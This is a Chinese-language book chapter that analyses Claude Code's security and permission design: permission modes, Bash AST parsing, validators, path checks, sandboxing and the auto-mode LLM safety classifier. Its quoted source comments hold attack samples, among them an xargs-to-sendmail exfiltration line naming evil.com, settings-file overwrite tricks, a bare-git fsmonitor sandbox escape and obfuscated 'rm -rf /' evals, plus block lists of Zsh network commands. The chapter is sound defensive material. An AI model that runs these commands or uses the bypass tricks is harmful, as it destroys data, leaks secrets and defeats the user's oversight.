# 第 10 章：安全与权限模型

## 10.1 概述与定位

Claude Code 的安全模型是整个系统中代码量最大、复杂度最高的子系统，涉及约 25,000 行 TypeScript 源码。它解决的核心问题是：**如何在赋予 AI 代理执行 shell 命令和修改文件的能力的同时，防止恶意指令注入、数据泄露和系统破坏**。

与传统 IDE 插件不同，Claude Code 面临一个独特的威胁模型：AI 模型本身可能被 prompt injection 引导执行危险操作，用户在代码库中克隆的恶意仓库可能通过文件名或内容构造攻击向量。安全系统必须在**模型输出**和**操作系统**之间建立一道可信验证层。

整个安全子系统可以用一个公式概括：

```
最终决策 = f(权限模式, 规则匹配, AST 分析, 安全验证器, 路径验证, 分类器, Hook, 沙箱)
```

这不是单层过滤器，而是一个 8 层纵深防御体系（Defense in Depth），每一层都独立可用，层层叠加。

## 10.2 理论基础

### 10.2.1 最小权限原则（Principle of Least Privilege）

Claude Code 默认拒绝所有写操作——每个工具调用都必须通过 `checkPermissions` 获得授权。权限模式从最严格（`default`——每次询问）到最宽松（`bypassPermissions`），用户主动选择信任级别。

### 10.2.2 沙箱模型（Sandboxing）

集成 `@anthropic-ai/sandbox-runtime`，在 macOS 使用 `sandbox-exec`，Linux 使用 `bubblewrap`（bwrap），在操作系统层面隔离文件系统和网络访问。沙箱独立于应用层权限检查——即使应用层判断失误，OS 层依然阻挡。

### 10.2.3 AST 分析在安全领域的应用

与传统的正则表达式匹配不同，Claude Code 使用完整的 Bash AST 解析（纯 TypeScript 实现的 tree-sitter 兼容解析器）来理解命令结构。这是安全验证的基石——正则无法区分 `echo "rm -rf /"` 和 `rm -rf /`，但 AST 可以。

### 10.2.4 纵深防御（Defense in Depth）

安全检查分布在 8 个独立层级，任一层拦截都能阻止危险操作。即使攻击者绕过了 AST 解析（如利用 parser differential），仍有路径验证、沙箱和用户确认作为后备。

## 10.3 权限模型架构

### 10.3.1 五级权限模式

权限模式定义在 `utils/permissions/PermissionMode.ts` 中，实际运行时共五级：

| 模式 | 行为 | 适用场景 |
|------|------|----------|
| `default` | 每次工具调用都询问用户 | 首次使用、高风险环境 |
| `acceptEdits` | 文件编辑自动通过，命令仍需确认 | 日常开发 |
| `plan` | 只生成计划不执行 | 架构设计、代码审查 |
| `auto` | LLM 分类器自动决策 | 高信任开发者 |
| `bypassPermissions` | 跳过所有权限检查 | 完全信任场景（可被策略禁用） |

模式切换时有完整的状态转换逻辑（`permissionSetup.ts:transitionPermissionMode`），包括：

- 进入 `auto` 模式时，自动剥离危险权限规则（`stripDangerousPermissionsForAutoMode`）
- 退出 `auto` 模式时，恢复被剥离的规则（`restoreDangerousPermissions`）
- `plan` 模式可内嵌 `auto` 模式（plan + auto-during-plan）

```typescript
// permissionSetup.ts:~580
export function transitionPermissionMode(
  fromMode: string,
  toMode: string,
  context: ToolPermissionContext,
): ToolPermissionContext {
  if (fromMode === toMode) return context
  // ...
  if (toUsesClassifier && !fromUsesClassifier) {
    autoModeStateModule?.setAutoModeActive(true)
    context = stripDangerousPermissionsForAutoMode(context)
  } else if (fromUsesClassifier && !toUsesClassifier) {
    autoModeStateModule?.setAutoModeActive(false)
    context = restoreDangerousPermissions(context)
  }
}
```

### 10.3.2 权限规则系统

权限规则（Permission Rules）是细粒度控制的核心，存储在多级配置中：

```typescript
// permissions.ts:~95
const PERMISSION_RULE_SOURCES = [
  ...SETTING_SOURCES, // userSettings, projectSettings, localSettings, flagSettings, policySettings
  'cliArg',
  'command',
  'session',
] as const
```

每条规则包含三个维度：
- **Source**（来源层级）：policySettings > flagSettings > localSettings > projectSettings > userSettings > session
- **Behavior**（行为）：`allow` / `deny` / `ask`
- **RuleValue**（匹配模式）：如 `Bash(git commit:*)` 表示允许所有 `git commit` 开头的命令

规则匹配支持三种模式：
1. **工具级匹配**：`Bash` 匹配所有 Bash 命令
2. **前缀匹配**：`Bash(npm run:*)` 匹配 `npm run` 开头的命令
3. **精确匹配**：`Bash(ls -la)` 仅匹配这一条命令

### 10.3.3 权限级联的完整流程

一次 Bash 命令的权限检查流经 `bashToolHasPermission`（`bashPermissions.ts`），完整路径如下：

```
1. 模式检查 → bypassPermissions 直接通过
2. deny 规则匹配 → 命中则拒绝
3. allow 规则匹配 → 命中则允许
4. 安全模式检查 → acceptEdits 等模式特殊处理
5. 命令 AST 解析 → tree-sitter 产出结构化命令
6. 安全验证器链 → 23 项静态检查
7. 只读验证 → 命令白名单 + flag 白名单
8. 路径验证 → 工作目录约束
9. LLM 分类器（可选）→ auto 模式下的 AI 决策
10. 用户确认 → 最终兜底
```

## 10.4 Bash 命令安全——八步分类流程

### 10.4.1 Tree-sitter AST 解析

这是整个安全系统最核心的创新。`utils/bash/ast.ts` 实现了基于 AST 的 bash 命令分析：

```typescript
// ast.ts:~1-20
/**
 * AST-based bash command analysis using tree-sitter.
 *
 * The key design property is FAIL-CLOSED: we never interpret structure we
 * don't understand. If tree-sitter produces a node we haven't explicitly
 * allowlisted, we refuse to extract argv and the caller must ask the user.
 *
 * This is NOT a sandbox. It answers exactly one question: "Can we produce
 * a trustworthy argv[] for each simple command in this string?"
 */
```

AST 解析的产出类型：

```typescript
// ast.ts:~30
export type ParseForSecurityResult =
  | { kind: 'simple'; commands: SimpleCommand[] }
  | { kind: 'too-complex'; reason: string; nodeType?: string }
  | { kind: 'parse-unavailable' }
```

关键设计：**Fail-Closed + Allowlist**。任何未在 allowlist 中的 AST 节点类型都导致整个命令被标记为 `too-complex`，要求用户确认。`DANGEROUS_TYPES` 集合定义了已知危险的节点类型：

```typescript
// ast.ts:~190
const DANGEROUS_TYPES = new Set([
  'command_substitution',   // $() 命令替换
  'process_substitution',   // <() >() 进程替换
  'expansion',              // 参数展开
  'subshell',               // 子 shell
  'for_statement',          // 控制流
  'if_statement',
  'function_definition',
  'brace_expression',       // 花括号展开
  // ... 共 18 种
])
```

### 10.4.2 纯 TypeScript Bash 解析器

`utils/bash/bashParser.ts`（4,436 行）是一个完整的 Bash 语法解析器，产出与 tree-sitter-bash WASM 解析器兼容的 AST。关键设计参数：

```typescript
// bashParser.ts:~28
const PARSE_TIMEOUT_MS = 50    // 50ms 超时，防止恶意输入
const MAX_NODES = 50_000       // 节点数上限，防止 OOM
```

解析器支持完整的 Bash 语法，包括 heredoc、ANSI-C 字符串、进程替换等。超时或节点爆炸时直接返回 `null`——fail-closed。

### 10.4.3 LLM 分类器（Bash Classifier）

用于 `auto` 模式。`bashClassifier.ts` 维护三组命令描述规则：

- **Allow descriptions**：描述哪些命令安全（如 "git read-only operations"）
- **Deny descriptions**：描述哪些命令危险（如 "commands that download and execute code"）
- **Ask descriptions**：需要用户确认的模式

分类器使用 `sideQuery` 调用独立的 Claude 实例进行判断，与主对话完全隔离。

### 10.4.4 环境变量过滤

`bashPermissions.ts` 定义了两组安全环境变量白名单：

```typescript
// bashPermissions.ts:~390
const SAFE_ENV_VARS = new Set([
  'NODE_ENV', 'RUST_LOG', 'PYTHONUNBUFFERED', 'LANG', 'TZ',
  'NO_COLOR', 'FORCE_COLOR', // ... 共 ~40 个
])
```

**安全注释特别有价值**——源码明确标注了哪些变量 **绝不能** 加入白名单：

```typescript
// bashPermissions.ts:~385 (注释)
// SECURITY: These must NEVER be added to the whitelist:
// - PATH, LD_PRELOAD, LD_LIBRARY_PATH, DYLD_* (execution/library loading)
// - PYTHONPATH, NODE_PATH (module loading)
// - NODE_OPTIONS (can contain code execution flags)
// - HOME, TMPDIR, SHELL, BASH_ENV (affect system behavior)
```

### 10.4.5 23 个 Shell 安全验证器

`bashSecurity.ts` 实现了 23 个独立的验证器，每个都有唯一的数字 ID：

```typescript
// bashSecurity.ts:~76
const BASH_SECURITY_CHECK_IDS = {
  INCOMPLETE_COMMANDS: 1,
  JQ_SYSTEM_FUNCTION: 2,
  JQ_FILE_ARGUMENTS: 3,
  OBFUSCATED_FLAGS: 4,
  SHELL_METACHARACTERS: 5,
  DANGEROUS_VARIABLES: 6,
  NEWLINES: 7,
  DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION: 8,
  DANGEROUS_PATTERNS_INPUT_REDIRECTION: 9,
  DANGEROUS_PATTERNS_OUTPUT_REDIRECTION: 10,
  IFS_INJECTION: 11,
  GIT_COMMIT_SUBSTITUTION: 12,
  PROC_ENVIRON_ACCESS: 13,
  MALFORMED_TOKEN_INJECTION: 14,
  BACKSLASH_ESCAPED_WHITESPACE: 15,
  BRACE_EXPANSION: 16,
  CONTROL_CHARACTERS: 17,
  UNICODE_WHITESPACE: 18,
  MID_WORD_HASH: 19,
  ZSH_DANGEROUS_COMMANDS: 20,
  BACKSLASH_ESCAPED_OPERATORS: 21,
  COMMENT_QUOTE_DESYNC: 22,
  QUOTED_NEWLINE: 23,
}
```

几个值得关注的验证器：

**命令替换检测**——不仅检测 `$()`，还覆盖了 Zsh 特有的攻击面：

```typescript
// bashSecurity.ts:~16
const COMMAND_SUBSTITUTION_PATTERNS = [
  { pattern: /<\(/, message: 'process substitution <()' },
  { pattern: />\(/, message: 'process substitution >()' },
  { pattern: /=\(/, message: 'Zsh process substitution =()' },
  { pattern: /(?:^|[\s;&|])=[a-zA-Z_]/, message: 'Zsh equals expansion (=cmd)' },
  { pattern: /\$\(/, message: '$() command substitution' },
  { pattern: /\$\{/, message: '${} parameter substitution' },
  // ... 还包括 PowerShell 注释语法的防御性拦截
  { pattern: /<#/, message: 'PowerShell comment syntax' },
]
```

**Zsh 危险命令拦截**——`zmodload` 是 Zsh 模块系统的入口，可加载 `zsh/system`（文件 I/O）、`zsh/net/tcp`（网络通信）等模块：

```typescript
// bashSecurity.ts:~44
const ZSH_DANGEROUS_COMMANDS = new Set([
  'zmodload',   // 模块加载入口
  'emulate',    // -c flag 是 eval 等价物
  'sysopen', 'sysread', 'syswrite',  // zsh/system 模块
  'zpty',       // 伪终端命令执行
  'ztcp',       // TCP 网络通信
  'zf_rm', 'zf_mv', 'zf_chmod',     // zsh/files 内建命令
  // ...
])
```

### 10.4.6 只读验证机制

`readOnlyValidation.ts` 维护了一套**命令白名单 + Flag 白名单**体系。以 `COMMAND_ALLOWLIST` 为核心：

```typescript
// readOnlyValidation.ts:~55
const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
  xargs: {
    safeFlags: { '-I': '{}', '-n': 'number', '-P': 'number', ... },
    // 注意 -i 和 -e 被移除，原因是 GNU getopt optional-arg 语义差异
  },
  grep: { safeFlags: { '-e': 'string', '-i': 'none', ... } },
  sort: { safeFlags: { '-r': 'none', '-n': 'none', ... } },
  tree: { safeFlags: { ... } },  // -R 被移除：tree -R -H 会写文件
  date: { safeFlags: { ... }, additionalCommandIsDangerousCallback: ... },
  // ... 总计约 30 个命令
}
```

每个命令的 Flag 白名单都有详细的安全注释。例如 `xargs` 的 `-i` 被移除：

```typescript
// readOnlyValidation.ts:~130 (注释)
// SECURITY: `-i` and `-e` (lowercase) REMOVED — both use GNU getopt
// optional-attached-arg semantics (`i::`, `e::`). The arg MUST be
// attached (`-iX`, `-eX`); space-separated (`-i X`, `-e X`) means the
// flag takes NO arg and `X` becomes the next positional (target command).
//
// `-i` (`i::` — optional replace-str):
//   echo /usr/sbin/sendm | xargs -it tail a@evil.com
//   validator: -it bundle (both 'none') OK, tail ∈ SAFE_TARGET → break
//   GNU: -i replace-str=t, tail → /usr/sbin/sendmail → NETWORK EXFIL
```

这种级别的安全分析——理解 GNU getopt 的 optional-arg 语义差异导致的解析器 differential——是整个安全模型中最令人印象深刻的部分。

### 10.4.7 路径验证与穿越防护

`pathValidation.ts`（1,303 行）实现了完整的路径安全体系：

**路径提取器**——为 34 种命令定义了专用的参数解析器：

```typescript
// pathValidation.ts:~170
export const PATH_EXTRACTORS: Record<PathCommand, (args: string[]) => string[]> = {
  cd: args => (args.length === 0 ? [homedir()] : [args.join(' ')]),
  find: args => { /* 复杂的 flag/path 分离逻辑 */ },
  grep: args => parsePatternCommand(args, flags),
  git: args => { /* git diff --no-index 特殊处理 */ },
  // ... 共 34 种命令
}
```

**POSIX `--` 处理**——正确处理 end-of-options 分隔符，防止 `-path` 类参数绕过路径验证：

```typescript
// pathValidation.ts:~105
// SECURITY: `rm -- -/../.claude/settings.local.json`
// 这里 `-/../.claude/settings.local.json` 以 `-` 开头，
// 如果不处理 `--`，naive 的 !arg.startsWith('-') 过滤器会丢弃它，
// 导致验证看到 0 个路径，返回 passthrough，文件被删除。
function filterOutFlags(args: string[]): string[] {
  const result: string[] = []
  let afterDoubleDash = false
  for (const arg of args) {
    if (afterDoubleDash) { result.push(arg) }
    else if (arg === '--') { afterDoubleDash = true }
    else if (!arg?.startsWith('-')) { result.push(arg) }
  }
  return result
}
```

**危险删除路径保护**——即使有 allowlist 规则，对 `/`、`/etc`、`/home` 等关键路径的 rm 操作始终需要用户确认：

```typescript
// pathValidation.ts:~70
function checkDangerousRemovalPaths(
  command: 'rm' | 'rmdir', args: string[], cwd: string
): PermissionResult {
  for (const path of paths) {
    if (isDangerousRemovalPath(absolutePath)) {
      return { behavior: 'ask', message: `Dangerous ${command} operation...` }
    }
  }
}
```

**cd + 写操作组合攻击防护**：

```typescript
// pathValidation.ts:~490
// SECURITY: Block write operations in compound commands containing 'cd'
// Example attack: cd .claude/ && mv test.txt settings.json
// This would bypass the check for .claude/settings.json because paths
// are resolved relative to the original CWD.
if (compoundCommandHasCd && operationType !== 'read') {
  return { behavior: 'ask', message: '...' }
}
```

## 10.5 FileEdit 验证链

FileEditTool 的验证链实现在 `FileEditTool.ts` 的 `validateInput` 方法中，共 12 步：

| 步骤 | 检查项 | 源码位置 |
|------|--------|----------|
| 1 | Team Memory Secret 检测 | `checkTeamMemSecrets(fullFilePath, new_string)` |
| 2 | old_string === new_string 无变更检查 | errorCode: 1 |
| 3 | Deny 规则匹配 | `matchingRuleForInput(..., 'deny')` |
| 4 | UNC 路径安全检查（防 NTLM 泄露） | `fullFilePath.startsWith('\\\\')` |
| 5 | 文件大小限制（1 GiB） | `MAX_EDIT_FILE_SIZE` |
| 6 | 文件编码检测与读取 | UTF-8 / UTF-16LE |
| 7 | 文件存在性验证 | 不存在时 old_string 必须为空 |
| 8 | Jupyter Notebook 拦截 | 引导使用 NotebookEditTool |
| 9 | **Must-Read-Before-Write** 检查 | `readFileState.get(fullFilePath)` |
| 10 | **mtime 并发修改检测** | `lastWriteTime > readTimestamp.timestamp` |
| 11 | **唯一性检查** | 多匹配时要求 `replace_all: true` |
| 12 | Settings 文件特殊验证 | `validateInputForSettingsFileEdit` |

其中步骤 9 和 10 构成了 **"先读后写"** 不变量：

```typescript
// FileEditTool.ts:~250
const readTimestamp = toolUseContext.readFileState.get(fullFilePath)
if (!readTimestamp || readTimestamp.isPartialView) {
  return {
    result: false, behavior: 'ask',
    message: 'File has not been read yet. Read it first before writing to it.',
  }
}
// ...
const lastWriteTime = getFileModificationTime(fullFilePath)
if (lastWriteTime > readTimestamp.timestamp) {
  // Windows 特殊处理：云同步/杀毒软件可能改变 mtime 但不改内容
  if (isFullRead && fileContent === readTimestamp.content) {
    // 内容未变，安全通过
  } else {
    return { result: false, message: 'File has been modified since read...' }
  }
}
```

## 10.6 沙箱机制

### 10.6.1 沙箱适配器架构

`utils/sandbox/sandbox-adapter.ts`（985 行）是 `@anthropic-ai/sandbox-runtime` 的适配层，将 Claude Code 的设置系统映射到沙箱运行时配置：

```typescript
// sandbox-adapter.ts:~160
export function convertToSandboxRuntimeConfig(
  settings: SettingsJson,
): SandboxRuntimeConfig {
  const allowWrite: string[] = ['.', getClaudeTempDir()]
  const denyWrite: string[] = []
  
  // 始终拒绝写入 settings 文件——防止沙箱逃逸
  denyWrite.push(...settingsPaths)
  denyWrite.push(getManagedSettingsDropInDir())
  
  // 拒绝写入 .claude/skills——同等权限级别
  denyWrite.push(resolve(originalCwd, '.claude', 'skills'))
  
  // 裸 Git 仓库攻击防护
  for (const gitFile of ['HEAD', 'objects', 'refs', 'hooks', 'config']) {
    const p = resolve(dir, gitFile)
    try { statSync(p); denyWrite.push(p) }
    catch { bareGitRepoScrubPaths.push(p) }
  }
}
```

### 10.6.2 裸 Git 仓库攻击防护

这是一个精妙的安全措施。攻击者可以在 cwd 植入 `HEAD`、`objects/`、`refs/` 文件，使 Git 的 `is_git_directory()` 误判 cwd 为裸仓库，然后通过 `core.fsmonitor` 配置执行任意代码：

```typescript
// sandbox-adapter.ts:~245
// SECURITY: Git's is_git_directory() treats cwd as a bare repo if it has
// HEAD + objects/ + refs/. An attacker planting these (plus a config with
// core.fsmonitor) escapes the sandbox when Claude's unsandboxed git runs.

// 策略：已存在的文件设为只读绑定，不存在的文件在命令执行后清理
function scrubBareGitRepoFiles(): void {
  for (const p of bareGitRepoScrubPaths) {
    try { rmSync(p, { recursive: true }) }
    catch { /* ENOENT 是正常情况 */ }
  }
}
```

### 10.6.3 网络隔离策略

沙箱支持域名级别的网络控制，从 WebFetch 工具的权限规则中提取允许的域名：

```typescript
// sandbox-adapter.ts:~190
for (const ruleString of permissions.allow || []) {
  const rule = permissionRuleValueFromString(ruleString)
  if (rule.toolName === WEB_FETCH_TOOL_NAME && 
      rule.ruleContent?.startsWith('domain:')) {
    allowedDomains.push(rule.ruleContent.substring('domain:'.length))
  }
}
```

企业策略可通过 `allowManagedDomainsOnly` 强制只使用管理员配置的域名。

## 10.7 Hook 系统与权限交互

### 10.7.1 PreToolUse / PostToolUse Hook

Hook 系统允许用户注入自定义的安全逻辑。`interactiveHandler.ts` 展示了 Hook 如何与权限决策竞争：

```typescript
// interactiveHandler.ts:~68
// 四路竞争：用户交互 / Hook / 分类器 / Bridge(CCR)
// 使用 claim() 原子操作确保只有一个赢家
void (async () => {
  if (isResolved()) return
  const hookDecision = await ctx.runHooks(
    currentAppState.toolPermissionContext.mode,
    result.suggestions,
    result.updatedInput,
    permissionPromptStartTimeMs,
  )
  if (!hookDecision || !claim()) return
  ctx.removeFromQueue()
  resolveOnce(hookDecision)
})()
```

### 10.7.2 权限决策的并发竞争模型

`PermissionContext.ts` 定义了 `createResolveOnce`——一个 "claim-then-resolve" 模式，确保在多个异步源（用户 UI、Hook、分类器、Bridge、Channel）竞争时只有一个赢家：

```typescript
// PermissionContext.ts:~80
function createResolveOnce<T>(resolve: (value: T) => void): ResolveOnce<T> {
  let claimed = false
  let delivered = false
  return {
    claim() {
      if (claimed) return false
      claimed = true
      return true
    },
    resolve(value: T) {
      if (delivered) return
      delivered = true; claimed = true
      resolve(value)
    },
  }
}
```

这种设计支持六路并发竞争：
1. **本地 UI** — 用户在终端中点击 Allow/Deny
2. **Hook** — PreToolUse hook 返回决策
3. **Bash Classifier** — LLM 分类器判断安全
4. **Bridge (CCR)** — Claude.ai Web UI 远程决策
5. **Channel** — Telegram/iMessage 等渠道回复
6. **Recheck** — 规则变更后自动重新检查

## 10.8 YOLO 分类器（Auto Mode Classifier）

### 10.8.1 架构

`yoloClassifier.ts`（1,495 行）实现了 `auto` 模式的 AI 安全分类器。它是一个独立的 Claude 实例，通过 `sideQuery` 调用，与主对话完全隔离：

```typescript
// yoloClassifier.ts:~400
const YOLO_CLASSIFIER_TOOL_SCHEMA: BetaToolUnion = {
  type: 'custom',
  name: 'classify_result',
  input_schema: {
    type: 'object',
    properties: {
      thinking: { type: 'string' },
      shouldBlock: { type: 'boolean' },
      reason: { type: 'string' },
    },
  },
}
```

### 10.8.2 两阶段 XML 分类器

分类器支持三种运行模式（`both` / `fast` / `thinking`），默认使用两阶段策略：

- **Stage 1（fast）**：max_tokens=64，nudge 立即给出 yes/no 决策。如果判定安全，直接返回。
- **Stage 2（thinking）**：仅在 Stage 1 判定为 "block" 时触发，使用 chain-of-thought 推理，减少 false positive。

```typescript
// yoloClassifier.ts:~680
const XML_S1_SUFFIX = '\nErr on the side of blocking. <block> immediately.'
const XML_S2_SUFFIX = '\nReview the classification process and follow it carefully...'
```

### 10.8.3 Transcript 压缩

分类器不接收完整的对话历史，而是通过 `buildTranscriptEntries` 将对话压缩为紧凑格式——只保留用户文本和助手的 tool_use blocks（排除助手文本，因为它可能被构造来影响分类器）：

```typescript
// yoloClassifier.ts:~480
// Only include tool_use blocks — assistant text is model-authored
// and could be crafted to influence the classifier's decision.
if (block.type === 'tool_use') {
  blocks.push({ type: 'tool_use', name: block.name, input: block.input })
}
```

### 10.8.4 Fast-Path 优化

在调用分类器之前，有三个 fast-path 可以跳过 LLM 调用：

1. **acceptEdits 模拟**：如果命令在 `acceptEdits` 模式下会被自动允许，直接通过
2. **Safe-tool 白名单**：`isAutoModeAllowlistedTool` 维护一组已知安全工具
3. **Denial tracking**：连续拒绝次数过多时，回退到直接询问用户

### 10.8.5 危险权限剥离

进入 `auto` 模式时，以下权限规则会被自动剥离（`stripDangerousPermissionsForAutoMode`）：

```typescript
// permissionSetup.ts:~100
export function isDangerousBashPermission(toolName: string, ruleContent: string | undefined): boolean {
  // Bash(*) — 允许所有命令
  if (ruleContent === undefined || ruleContent === '') return true
  // python:*, node:*, bash:* — 脚本解释器
  for (const pattern of DANGEROUS_BASH_PATTERNS) {
    if (content === `${lowerPattern}:*`) return true
    // ...
  }
}
```

这确保了即使用户之前保存了 `Bash(python:*)` 这样的宽泛规则，在 `auto` 模式下也不会绕过分类器。

## 10.9 设计决策分析

### 10.9.1 为什么用 AST 解析而非正则

正则表达式无法处理 **parser differential** 攻击。例如：

```bash
echo "rm -rf /"   # 正则会误报——这只是 echo 的参数
rm -rf /           # 正则才应该报这个
```

更危险的是 **引号嵌套**和 **shell 展开**：

```bash
ev"al" 'rm -rf /'    # 正则可能看不到 eval
$'\x65\x76\x61\x6c' 'rm -rf /'  # ANSI-C 字符串编码的 eval
```

AST 解析器理解语法结构，能正确区分命令名和参数。且 fail-closed 设计意味着任何无法解析的结构都需要用户确认。

### 10.9.2 LLM 分类器的引入时机与 Tradeoff

分类器仅在 `auto` 模式下使用，且有严格的成本控制：

- **延迟**：两阶段设计，Stage 1 通常 <100ms（max_tokens=64 + prompt cache）
- **成本**：使用 `sideQuery` 走独立的 API 调用，不计入主对话的 token 消耗
- **准确性**：Stage 2 的 chain-of-thought 将 false positive 降到合理水平
- **可靠性**：分类器不可用时 fail-closed（回退到询问用户）

### 10.9.3 安全 vs 可用性的平衡

Claude Code 通过**渐进式信任**（progressive trust）平衡两者：

1. 首次使用：每个命令都需确认
2. 保存规则后：匹配的命令自动通过
3. `acceptEdits` 模式：文件编辑自动通过
4. `auto` 模式：AI 分类器判断
5. `bypassPermissions`：完全信任

同时通过**智能建议**（`suggestionForExactCommand` / `suggestionForPrefix`）引导用户逐步建立信任规则，而非一步到位。

### 10.9.4 与竞品安全模型对比

| 维度 | Claude Code | Cursor | GitHub Copilot |
|------|------------|--------|----------------|
| 命令分析 | AST 解析 + 23 验证器 | 基本正则 | 不执行命令 |
| 沙箱 | OS 级（sandbox-exec/bwrap） | 无 | N/A |
| 权限模型 | 5 级 + 细粒度规则 | 二元（允许/拒绝） | N/A |
| AI 分类器 | 独立 LLM 实例 | 无 | 无 |
| 路径验证 | 34 种命令专用解析器 | 基本检查 | N/A |
| 企业策略 | policySettings 层 | 有限 | 组织策略 |

## 10.10 可迁移模式

1. **Fail-Closed Allowlist 模式**：AST 解析的核心原则——只理解已知安全结构，其余一律拒绝。适用于任何需要解析不可信输入的场景。

2. **Claim-then-Resolve 并发模式**：`createResolveOnce` 解决了多异步源竞争决策的问题。在任何需要"第一个到达的决策者赢"的场景中可复用。

3. **渐进式信任升级**：从最严格模式开始，通过用户行为逐步建立信任规则。比"一开始就要选择信任级别"更符合人类心理。

4. **分类器 Fast-Path + 两阶段**：先用规则/白名单/模拟跳过明显安全的操作，只对不确定的调用 LLM。两阶段策略（fast + thinking）在延迟和准确性间取得平衡。

5. **Parser Differential 防御**：不仅用自己的解析器，还系统性地检查 shell 特性差异（GNU vs BSD getopt、Zsh vs Bash 展开规则）。这种思维方式可迁移到任何涉及多层解释器的系统。

6. **权限规则的来源层级**：多层配置合并（policy > flag > local > project > user > session），企业策略总是赢。通用的配置优先级模型。

7. **沙箱 + 应用层双保险**：即使应用层权限检查被绕过，OS 沙箱仍然阻挡——反之亦然。两层独立失效。

## 10.11 源码索引

| 文件 | 行数 | 核心功能 |
|------|------|----------|
| `tools/BashTool/bashPermissions.ts` | 2,621 | Bash 权限决策主入口，规则匹配，命令前缀提取 |
| `tools/BashTool/bashSecurity.ts` | 2,592 | 23 个安全验证器，引号解析，命令替换检测 |
| `tools/BashTool/readOnlyValidation.ts` | 1,990 | 命令白名单，Flag 白名单，只读验证 |
| `tools/BashTool/pathValidation.ts` | 1,303 | 34 种命令的路径提取器，危险路径检测 |
| `tools/BashTool/BashTool.tsx` | 1,143 | Bash 工具入口，输入 schema，执行逻辑 |
| `tools/BashTool/prompt.ts` | 369 | Bash 工具提示词，沙箱说明 |
| `tools/FileEditTool/FileEditTool.ts` | ~400 | 文件编辑 12 步验证链 |
| `utils/permissions/permissions.ts` | 1,486 | 权限决策总入口，规则匹配，auto 模式集成 |
| `utils/permissions/permissionSetup.ts` | 1,532 | 权限模式配置，危险规则检测与剥离 |
| `utils/permissions/yoloClassifier.ts` | 1,495 | Auto 模式 LLM 分类器，两阶段 XML 协议 |
| `utils/permissions/filesystem.ts` | 1,777 | 文件系统权限，路径安全，Claude 配置保护 |
| `utils/bash/ast.ts` | 2,679 | Bash AST 分析，allowlist 节点遍历 |
| `utils/bash/bashParser.ts` | 4,436 | 纯 TypeScript Bash 解析器 |
| `hooks/toolPermission/handlers/interactiveHandler.ts` | 536 | 交互式权限处理，六路竞争模型 |
| `hooks/toolPermission/PermissionContext.ts` | 388 | 权限上下文，claim-then-resolve |
| `utils/sandbox/sandbox-adapter.ts` | 985 | 沙箱配置适配，裸 Git 仓库防护 |

---

*本章分析基于 Claude Code TypeScript 源码快照（2026-03-31，~512K LOC）。涉及安全相关代码约 25,000 行，覆盖 16 个核心文件。所有代码片段均从源文件精确复制并标注位置。*
